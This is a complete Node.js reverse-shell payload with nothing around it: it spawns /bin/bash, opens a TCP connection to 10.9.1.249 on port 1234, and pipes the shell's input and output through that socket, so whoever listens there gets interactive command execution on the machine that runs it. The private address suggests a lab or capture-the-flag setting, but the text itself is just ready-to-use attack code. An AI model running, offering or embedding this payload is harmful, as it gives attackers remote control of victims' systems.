(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/bash",[]);

    var client = new net.Socket();
    client.connect(1234, "10.9.1.249", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        
    });
}());